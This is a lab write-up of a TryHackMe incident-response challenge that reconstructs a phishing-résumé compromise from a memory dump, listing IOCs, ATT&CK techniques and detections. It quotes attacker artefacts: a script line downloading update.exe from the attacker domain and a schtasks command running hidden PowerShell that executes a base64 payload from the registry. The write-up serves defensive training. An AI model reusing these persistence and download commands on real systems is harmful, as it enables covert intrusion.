# Memory forensics — malicious résumé to fileless persistence (TryHackMe: Boogeyman 2)

**Type:** lab exercise (TryHackMe, "Boogeyman 2", SOC Level 1 **Capstone Challenge**)
**Role:** SOC L1 / incident responder
**Goal:** reconstruct a compromise from a phishing email and a **memory dump** of the victim's workstation, with no disk image and no logs.

> Lab exercise, not a real incident.

**Victim:** `maxine.beck@quicklogisticsorg.onmicrosoft.com` (Quick Logistics LLC)
**Data sources:** phishing email (`.eml`), memory dump `WKSTN-2961.raw` (~1 GB).
**Tooling:** Python `email` module, `olevba`, **Volatility 3**, `strings` / `grep`.

---

## 1. Initial access: fake job application

| Field | Value |
|---|---|
| From | `westaylor23@outlook.com` |
| Subject | Resume - Application for Junior IT Analyst Role |
| Attachment | `Resume_WesleyTaylor.doc` |
| MD5 | `52c4384a0b9e248b95804352ebec6c5b` |

The VM had no internet and no `ripmime`, so the attachment was extracted with Python's standard library:

```python
import email
msg = email.message_from_binary_file(open('Resume - Application for Junior IT Analyst Role.eml', 'rb'))
for part in msg.walk():
    if part.get_filename():
        open(part.get_filename(), 'wb').write(part.get_payload(decode=True))
```

`olevba` showed an auto-run macro that downloads the stage 2 payload:
`https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`
The file has a `.png` extension in the URL but is saved to disk as a script.

## 2. Execution: process tree

```bash
vol -f WKSTN-2961.raw windows.pstree
vol -f WKSTN-2961.raw windows.cmdline
```

```
WINWORD.EXE (PID 1124)
 └─ wscript.exe (PID 4260)   →  wscript.exe C:\ProgramData\update.js
```

`WINWORD.EXE` spawning `wscript.exe` is enough on its own to call this malicious: Word has no legitimate reason to start a script host.

## 3. Stage 3: when the plugin can't find the file

`update.js` was **not** in `windows.filescan` output, so `dumpfiles` couldn't recover it, and a partial process dump of `wscript.exe` held only certificate-validation URLs. The way through was to search the raw dump for the attacker's domain:

```bash
strings WKSTN-2961.raw | grep -iaF 'boogeymanisback' | sort -u
```

This surfaced a line from the script body:

```js
var url = "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe"
```

## 4. Command and control

```bash
vol -f WKSTN-2961.raw windows.netscan
```

| Property | Value |
|---|---|
| Process | `updater.exe` (PID **6216**) |
| Path | `C:\Windows\Tasks\updater.exe` |
| C2 | **`128.199.95.189:8080`** (repeated connections) |

`C:\Windows\Tasks\` is a system folder users rarely look in, which makes it a typical place to hide a binary.

## 5. Persistence: fileless, payload in the registry

Found with `strings` on the raw dump (`schtasks /create`):

```
schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""
```

Every day at 09:00 a hidden PowerShell reads a base64 blob from the registry value `HKCU\Software\Microsoft\Windows\CurrentVersion\debug` and executes it with `IEX`. Nothing malicious lives on disk for this stage, so file scanning won't catch it. The operator's own status message, also in memory, confirmed it: *"Schtasks persistence established ... with Updater daily trigger at 09:00."*

The original attachment was also located in memory in the Outlook attachment cache (`...\INetCache\Content.Outlook\<random folder>\`), via `windows.filescan`.

## 6. IOCs

| Type | Indicator |
|---|---|
| Email | `westaylor23@outlook.com` |
| MD5 | `52c4384a0b9e248b95804352ebec6c5b` (`Resume_WesleyTaylor.doc`) |
| Domain | `files.boogeymanisback.lol` |
| URL | `.../aa2a9c53cbb80416d3b47d85538d9971/update.png`, `.../update.exe` |
| File | `C:\ProgramData\update.js`, `C:\Windows\Tasks\updater.exe` |
| IP:port | `128.199.95.189:8080` |
| Persistence | scheduled task `Updater`; registry value `HKCU\...\CurrentVersion\debug` |

## 7. ATT&CK mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1566.001 Spearphishing Attachment |
| Execution | T1204.002 Malicious File; T1059.005 VBA macro; T1059.007 JScript (`wscript`); T1059.001 PowerShell |
| Persistence | T1053.005 Scheduled Task |
| Defense Evasion | T1112 Modify Registry (payload storage); T1027 Obfuscated Files (base64); T1036 Masquerading (`.png`, `C:\Windows\Tasks\`) |
| Command & Control | T1071.001 Web Protocols; T1105 Ingress Tool Transfer; T1571 Non-Standard Port (8080) |

## 8. Detection & response

**High-value detections**
- Office application spawning `wscript.exe` / `cscript.exe` / `powershell.exe`.
- Executables running from `C:\Windows\Tasks\` or scripts from `C:\ProgramData\`.
- Scheduled task whose action is `powershell -W hidden ... IEX ... FromBase64String`.
- PowerShell reading large values from `HKCU\...\CurrentVersion`.

**Response**
- Isolate the host; kill `updater.exe`; delete the `Updater` task **and** the `debug` registry value (removing only the task leaves the payload in place).
- Block `boogeymanisback.lol` and `128.199.95.189`; hunt for the attachment hash across mailboxes.
- Disable macros from internet-sourced documents (Mark-of-the-Web policy).

---

## Techniques & tools

`Volatility 3 (pstree, cmdline, netscan, filescan, memmap)` · `olevba` · `Python email` · `strings/grep on raw memory` · fileless persistence analysis · MITRE ATT&CK mapping
